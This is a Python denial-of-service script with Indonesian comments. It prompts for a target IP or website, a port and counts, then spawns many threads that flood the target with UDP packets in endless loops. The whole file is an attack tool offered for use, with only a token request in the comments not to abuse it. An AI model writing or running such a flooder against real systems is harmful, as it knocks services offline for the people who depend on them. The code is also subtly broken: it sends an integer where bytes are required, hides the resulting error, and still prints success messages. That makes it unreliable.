import random
import socket
import threading

# Tools Denial of Service dengan bahasa Indonesia
# Dilarang menggunakan tools ini untuk abusing atau memperjual-belikan toolsnya'
# Kami mengizinkan siapapun untuk merecode sourcenya

# Hiasan / Design aja!

target_server = str(input("[ -> ] Ketikkan Alamat IP / Website target: ")) # Masukkan Server IP / Target Website
port_server = int(input("[ -> ] Masukkan Port target: ")) # Masukkan Port Server, Contohnya (80)
mengirim_request = int(input("[ -> ] Mengirim Request ke Server (10000 - 175000): ")) # Masukkan Jumlah Request yang akan di kirim
mengirim_thread = int(input("[ -> ] Jumlah thread yang akan di kirim (15000 - 95000): ")) # Masukkan Jumlah Thread yang akan di kirim

def attack():
    urandom_disini = random._urandom(9) # Silahkan ubah angka urandom sesuka hati anda
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((target_server,port_server))
            s.send(urandom_disini)
            for x in range(mengirim_request):
                s.send(mengirim_thread)
            print("Berhasil mengirim serangan DoS ke", target_server, ", Melakukan serangan pada port", port_server)
        except:
            s.close()

for y in range(mengirim_thread):
    th = threading.Thread(target = attack)
    th.start()
    
